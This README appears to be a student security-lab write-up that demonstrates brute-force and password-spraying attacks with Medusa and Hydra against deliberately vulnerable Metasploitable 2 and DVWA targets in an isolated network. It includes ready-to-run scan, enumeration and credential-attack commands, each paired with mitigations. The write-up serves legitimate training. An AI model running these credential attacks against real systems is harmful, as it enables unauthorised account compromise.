# Security Lab: Brute-Force Simulation (Kali + Medusa)

Professional, reproducible security lab showcasing credential attack techniques against intentionally vulnerable targets in a controlled environment. This report-style README documents scope, setup, execution, evidence collection, and mitigation guidance.

## Executive Summary
- Objective: demonstrate brute-force and password spraying against FTP, a web form (DVWA), and SMB in a lab.
- Outcome: successful authentication obtained during tests using controlled wordlists; recommendations provided to reduce risk.
- Impact: illustrates how weak credentials, lack of rate limiting, and legacy services enable compromise.

## Scope & Rules of Engagement
- Targets: Metasploitable 2 (FTP/SMB) and DVWA running on a LAMP stack.
- Attacker: Kali Linux.
- Network: VirtualBox Host-Only/Internal network, isolated from internet.
- Authorization: lab-only; do not attack systems you do not own.

## Lab Topology
- VirtualBox VMs
  - Kali Linux (Attacker): 192.168.56.10 (example)
  - Metasploitable 2 (Target): 192.168.56.20 (example)
  - DVWA host (Target): 192.168.56.30 (example)
- All VMs on the same host-only network.

## Tooling & Versions
- Kali Linux 2024.x
- Medusa 2.x
- Metasploitable 2
- DVWA (Damn Vulnerable Web Application)
- Nmap, enum4linux-ng
- Optional: Hydra (for DVWA web-form brute force)

## Repository Layout
- /wordlists – sample users/passwords used in tests
- /images – optional screenshots as evidence
- /scripts – optional helper scripts
- README.md – this document

## Setup
1) Networking: create a Host-Only network in VirtualBox, assign static IPs to VMs.
2) DVWA: install and configure DVWA on a LAMP stack; set DVWA Security to Low. Note the PHPSESSID/cookies.
3) Verify reachability with ping and port scans.

```bash
# Example discovery from Kali
nmap -sV -O 192.168.56.20
nmap -sV -p 21,80,139,445 192.168.56.20
```

---

## Test Case 1 — FTP Brute Force (Metasploitable 2)
- Service: vsftpd on 21/tcp
- Goal: identify weak credentials

Reconnaissance
```bash
nmap -sV -p 21 192.168.56.20
```

Sample wordlist
- wordlists/ftp-passwords.txt: msfadmin, 123456, password, admin, toor

Attack (Medusa)
```bash
medusa -h 192.168.56.20 -u msfadmin -P wordlists/ftp-passwords.txt -M ftp -n 21 -t 4 -f -v 6
```
- -f stops on first valid credential; -t sets threads; -v increases verbosity.

Validation
```bash
ftp 192.168.56.20
# username: msfadmin  | password: <discovered>
```

Mitigations
- Disable anonymous/weak accounts; enforce strong passwords
- Rate limiting and lockout policies
- Replace/secure legacy FTP (e.g., SFTP/FTPS)

---

## Test Case 2 — Web Form Brute Force (DVWA)
- Target: DVWA Brute Force challenge
- Note: DVWA includes CSRF tokens and cookies. Medusa's http-form module may require static tokens. Hydra is recommended for this case.

Attack (Hydra — recommended)
```bash
hydra -l admin -P wordlists/web-passwords.txt 192.168.56.30 \
  http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:Welcome to the password protected area" \
  -s 80 -V -I -f -t 4
```
- Adjust cookie with -H "Cookie: security=low; PHPSESSID=<id>" if needed.

Validation
- Browse to DVWA brute-force page and authenticate with discovered credentials.

Mitigations
- Add account lockout, rate limiting, CAPTCHAs
- Enforce strong, unique passwords and MFA
- Implement CSRF protections and monitoring

---

## Test Case 3 — SMB Password Spraying with User Enumeration
- Services: NetBIOS/SMB on 139/445
- Goal: enumerate users and attempt low-and-slow password spraying

Enumeration
```bash
enum4linux-ng -A 192.168.56.20 | tee images/enum_smb.txt
# Alternative (null session may be blocked):
rpcclient -U "" -N 192.168.56.20 -c "enumdomusers"
```
- Build wordlists/users.txt from discovered accounts.
- Build wordlists/spray.txt with a few common passwords.

Spray (Medusa)
```bash
medusa -h 192.168.56.20 -U wordlists/users.txt -P wordlists/spray.txt -M smbnt -t 4 -f -v 6
```
- For old Samba stacks (like Metasploitable 2), module smbnt is effective; adjust -m DOMAIN/WORKGROUP if required.

Validation
```bash
smbclient -L //192.168.56.20 -U <user>%<password>
```

Mitigations
- Account lockout for failed attempts; disable SMBv1
- Remove/disable unused accounts; least-privilege
- Strong password policy and monitoring

---

## Evidence Handling
- Store terminal output and screenshots in /images with clear filenames.
- Record successful credential pairs and timestamps.

## Ethical & Legal Notice
All activities were performed in a closed lab under authorization. Never execute these techniques against systems you do not own.

## Key Learnings & Reflections
- Weak/default credentials remain a primary risk.
- Rate limiting and lockout are critical defensive controls.
- Enumeration dramatically improves success rates of password spraying.

## References
- Kali Linux: https://www.kali.org/
- DVWA: https://github.com/digininja/DVWA
- Medusa: https://foofus.net/goons/jmk/medusa/medusa.html
- Nmap: https://nmap.org/book/man-briefoptions.html
- enum4linux-ng: https://github.com/cddmp/enum4linux-ng
- Hydra: https://github.com/vanhauser-thc/thc-hydra

## Author
- Leonardo Costa
- Fullstack Developer
- Security Lab – DIO Challenge

## License
MIT (adjust as needed)

